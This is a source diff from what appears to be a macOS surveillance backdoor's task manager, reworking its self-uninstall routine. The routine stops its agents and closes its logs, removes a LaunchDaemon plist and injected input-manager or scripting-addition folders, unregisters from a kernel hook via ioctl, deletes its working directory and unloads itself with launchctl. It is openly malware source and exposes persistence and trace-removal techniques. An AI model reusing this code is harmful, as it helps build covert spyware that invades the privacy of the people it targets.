@@ -184,24 +184,23 @@ static NSLock *gSyncLock                  = nil;
       //
       // Start events monitoring
       //
-      [self eventsMonitor];
-      /*
+      //[self eventsMonitor];
+      
       [NSThread detachNewThreadSelector: @selector(eventsMonitor)
                                toTarget: self
                              withObject: nil];
-      */
+      
     }
   else
     {
 #ifdef DEBUG_TASK_MANAGER
-      infoLog(@"An error occurred while loading the configuration file");
+      errorLog(@"An error occurred while loading the configuration file");
 #endif
 
       exit(-1);
     }
   
   [outerPool release];
-  
   return TRUE;
 }
 
@@ -359,203 +358,201 @@ static NSLock *gSyncLock                  = nil;
     }
 #endif
 
-  /*if ([self stopEvents] == TRUE)
-  //if (1)
+  //
+  // Stop all events
+  //
+  //if ([self stopEvents] == NO)
+    //{
+//#ifdef DEBUG_TASK_MANAGER
+      //errorLog(@"Error while stopping events");
+//#endif
+    //}
+  //else
+    //{
+//#ifdef DEBUG_TASK_MANAGER
+      //infoLog(@"Events stopped correctly");
+//#endif
+    //}
+      
+  //
+  // Stop all agents
+  //
+  if ([self stopAgents] == NO)
     {
 #ifdef DEBUG_TASK_MANAGER
-      infoLog(@"Events stopped correctly");
+      errorLog(@"Error while stopping agents");
 #endif
-      
-      if ([self stopAgents] == TRUE)
-      //if (2)
+    }
+  else
+    {
+#ifdef DEBUG_TASK_MANAGER
+      infoLog(@"Agents stopped correctly");
+#endif
+    }
+
+#ifdef DEBUG_TASK_MANAGER
+  infoLog(@"Closing active logs");
+#endif
+
+  RCSMLogManager *_logManager  = [RCSMLogManager sharedInstance];
+  if ([_logManager closeActiveLogsAndContinueLogging: NO])
+    {
+#ifdef DEBUF
+      infoLog(@"Active logs closed correctly");
+#endif
+    }
+  else
+    {
+#ifdef DEBUG_TASK_MANAGER
+      errorLog(@"An error occurred while closing active logs");
+#endif
+    }
+
+  NSString *backdoorPlist = [NSString stringWithFormat: @"%@/%@",
+                             [[[[[NSBundle mainBundle] bundlePath]
+                                stringByDeletingLastPathComponent]
+                               stringByDeletingLastPathComponent]
+                              stringByDeletingLastPathComponent],
+                             BACKDOOR_DAEMON_PLIST];
+
+  //
+  // Remove the LaunchDaemon plist
+  //
+  [[NSFileManager defaultManager] removeItemAtPath: backdoorPlist
+                                             error: nil];
+
+  int activeBackdoors = 1;
+
+#ifndef NO_KEXT
+  int kextFD  = open(BDOR_DEVICE, O_RDWR);
+  int ret     = 0;
+
+  //
+  // Get the number of active backdoors since we won't remove the
+  // input manager if there's even one still registered
+  //
+  ret = ioctl(kextFD, MCHOOK_GET_ACTIVES, &activeBackdoors);
+
+  //
+  // Unregister from kext
+  //
+  const char *userName = [NSUserName() UTF8String];
+  ret = ioctl(kextFD, MCHOOK_UNREGISTER, userName);
+#endif
+
+  // Just ourselves
+  if (activeBackdoors == 1)
+    {
+      if (getuid() == 0 || geteuid() == 0)
+        {
+          NSString *destDir = nil;
+
+          if (gOSMajor == 10 && gOSMinor == 6) 
+            {
+#ifdef DEBUG_TASK_MANAGER
+              infoLog(@"Removing scripting additions");
+#endif
+              destDir = [[NSString alloc]
+                initWithFormat: @"/Library/ScriptingAdditions/%@",
+                OSAX_FOLDER];
+            }
+          else if (gOSMajor == 10 && gOSMinor == 5) 
+            {
+#ifdef DEBUG_TASK_MANAGER
+              infoLog(@"Removing input manager");
+#endif
+              destDir = [[NSString alloc]
+                initWithFormat: @"/Library/InputManagers/%@",
+                INPUT_MANAGER_FOLDER ];
+            }
+
+          NSError *err;
+
+          if (![[NSFileManager defaultManager] removeItemAtPath: destDir
+                                                          error: &err])
+            {
+#ifdef DEBUG_TASK_MANAGER
+              errorLog(@"uid (%d) euid (%d)", getuid(), geteuid());
+              errorLog(@"Error while removing the input manager");
+              errorLog(@"error: %@", [err localizedDescription]);
+#endif
+            }
+
+          [destDir release];
+        }
+      else
         {
 #ifdef DEBUG_TASK_MANAGER
-          infoLog(@"Agents stopped correctly");
-#endif*/
-          
-          /*
-          //
-          // Delete log files
-          //
-          NSString *encryptedLogExtension = [[mConfigManager encryption] 
-                                             scrambleForward: NEWCONF
-                                                        seed: gBackdoorSignature[0]];
-          
-          NSArray *logFiles = searchFile(encryptedLogExtension);
-          
-          for (NSString *logFile in logFiles)
-            {
+          errorLog(@"I don't have privileges for removing the input manager :(");
+          errorLog(@"uid (%d) euid (%d)", getuid(), geteuid());
+#endif
+        }
+    }
+  else
+    {
 #ifdef DEBUG_TASK_MANAGER
-              infoLog(@"Removing log: %@", logFile);
+      warnLog(@"Won't remove injector, there are still registered backdoors (%d)", activeBackdoors);
 #endif
-              [[NSFileManager defaultManager] removeItemAtPath: logFile
-                                                         error: nil];
-            }
-          */
-          
+    }
+
 #ifdef DEBUG_TASK_MANAGER
-          infoLog(@"Uninstall called");
-          infoLog(@"Closing active logs");
+  infoLog(@"Removing SLI Plist just in case");
 #endif
-          
-          RCSMLogManager *_logManager  = [RCSMLogManager sharedInstance];
-          if ([_logManager closeActiveLogsAndContinueLogging: NO])
-            {
-#ifdef DEBUF
-              infoLog(@"Active logs closed correctly");
-#endif
-            }
-          else
-            {
+  [gUtil removeBackdoorFromSLIPlist];
+
+  //
+  // Remove our working dir
+  //
+  if ([[NSFileManager defaultManager] removeItemAtPath: [[NSBundle mainBundle] bundlePath]
+                                                 error: nil])
+    {
 #ifdef DEBUG_TASK_MANAGER
-              errorLog(@"An error occurred while closing active logs");
+      infoLog(@"Backdoor dir removed correctly");
 #endif
-            }
-          
-          //
-          // Remove the LaunchDaemon plist
-          //
-          NSString *backdoorPlist = [NSString stringWithFormat: @"%@/%@",
-                                     [[[[[NSBundle mainBundle] bundlePath]
-                                        stringByDeletingLastPathComponent]
-                                       stringByDeletingLastPathComponent]
-                                      stringByDeletingLastPathComponent],
-                                     BACKDOOR_DAEMON_PLIST ];
-          
-          [[NSFileManager defaultManager] removeItemAtPath: backdoorPlist
-                                                     error: nil];
-  
-          int activeBackdoors = 1;
-  
-#ifndef NO_KEXT
-          int kextFD  = open(BDOR_DEVICE, O_RDWR);
-          int ret     = 0;
-          
-          //
-          // Get the number of active backdoors since we won't remove the
-          // input manager if there's even one still registered
-          //
-          ret = ioctl(kextFD, MCHOOK_GET_ACTIVES, &activeBackdoors);
-          
-          const char *userName = [NSUserName() UTF8String];
-          ret = ioctl(kextFD, MCHOOK_UNREGISTER, userName);
-#endif
-          sleep(1);
-          
-          // Just ourselves
-          if (activeBackdoors == 1)
-            {
-              if (getuid() == 0 || geteuid() == 0)
-                {
-                  NSString *destDir = nil;
-                  
-                  if (gOSMajor == 10 && gOSMinor == 6) 
-                    {
+    }
+  else
+    {
 #ifdef DEBUG_TASK_MANAGER
-                      infoLog(@"Removing scripting additions");
+      infoLog(@"An error occurred while removing backdoor dir");
 #endif
-                      destDir = [[NSString alloc]
-                                 initWithFormat: @"/Library/ScriptingAdditions/%@",
-                                                 OSAX_FOLDER];
-                    }
-                  else if (gOSMajor == 10 && gOSMinor == 5) 
-                    {
-#ifdef DEBUG_TASK_MANAGER
-                      infoLog(@"Removing input manager");
-#endif
-                      destDir = [[NSString alloc]
-                                 initWithFormat: @"/Library/InputManagers/%@",
-                                                 INPUT_MANAGER_FOLDER ];
-                    }
-                
-                  NSError *err;
-                  
-                  if (![[NSFileManager defaultManager] removeItemAtPath: destDir
-                                                                  error: &err])
-                    {
-#ifdef DEBUG_TASK_MANAGER
-                      errorLog(@"uid (%d) euid (%d)", getuid(), geteuid());
-                      errorLog(@"Error while removing the input manager");
-                      errorLog(@"error: %@", [err localizedDescription]);
-#endif
-                    }
-                  
-                  [destDir release];
-                }
-              else
-                {
-#ifdef DEBUG_TASK_MANAGER
-                  errorLog(@"I don't have privileges for removing the input manager :(");
-                  errorLog(@"uid (%d) euid (%d)", getuid(), geteuid());
-#endif
-                }
-            }
-          else
-            {
-#ifdef DEBUG_TASK_MANAGER
-              warnLog(@"Won't remove injector, there are still registered backdoors (%d)", activeBackdoors);
-#endif
-            }
-#ifdef DEBUG_TASK_MANAGER
-          infoLog(@"Removing SLI Plist just in case");
-#endif
-          [gUtil removeBackdoorFromSLIPlist];
-          
-          //
-          // Remove our working dir
-          //
-          if ([[NSFileManager defaultManager] removeItemAtPath: [[NSBundle mainBundle] bundlePath]
-                                                         error: nil])
-            {
-#ifdef DEBUG_TASK_MANAGER
-              infoLog(@"Backdoor dir removed correctly");
-#endif
-            }
-          else
-            {
-#ifdef DEBUG_TASK_MANAGER
-              infoLog(@"An error occurred while removing backdoor dir");
-#endif
-            }
-          
-          [gSharedMemoryCommand detachFromMemoryRegion];
-          
+    }
+
+  [gSharedMemoryCommand detachFromMemoryRegion];
+
 #ifdef DEMO_VERSION
-          changeDesktopBackground(@"/Library/Desktop Pictures/Aqua Blue.jpg", TRUE);
+  changeDesktopBackground(@"/Library/Desktop Pictures/Aqua Blue.jpg", TRUE);
 #endif
-          
-          // Unregister uspace component
+
+  // Unregister uspace component
 #ifdef DEBUG_TASK_MANAGER
-          infoLog(@"Unregistering uspace components");
+  infoLog(@"Unregistering uspace components");
 #endif
 
 #ifndef NO_KEXT
-          close(kextFD);
+  close(kextFD);
 #endif
-          //
-          // Unload our service from LaunchDaemon
-          //
-          NSArray *_commArguments = [[NSArray alloc] initWithObjects:
-                                     @"remove",
-                                     [[backdoorPlist lastPathComponent]
-                                      stringByDeletingPathExtension],
-                                     nil];
-          [gUtil executeTask: @"/bin/launchctl"
-                withArguments: _commArguments
-                 waitUntilEnd: YES];
-          
-          sleep(3);
-          //[gUtil release];
-        
-          [gSuidLock unlock];
-  
+
+  //
+  // Unload our service from LaunchDaemon
+  //
+  NSArray *_commArguments = [[NSArray alloc] initWithObjects:
+                             @"remove",
+                             [[backdoorPlist lastPathComponent]
+                              stringByDeletingPathExtension],
+                             nil];
+  [gUtil executeTask: @"/bin/launchctl"
+       withArguments: _commArguments
+        waitUntilEnd: YES];
+
+  sleep(3);
+  [gSuidLock unlock];
+
 #ifdef DEBUG_TASK_MANAGER
-          verboseLog(@"exit critical session [euid/uid %d/%d]", 
-                     geteuid(), getuid());
+  verboseLog(@"exit critical session [euid/uid %d/%d]", 
+             geteuid(), getuid());
 #endif
-          exit(0);
-        //}
-    //}
+
+  exit(0);
 }
 
 #pragma mark -
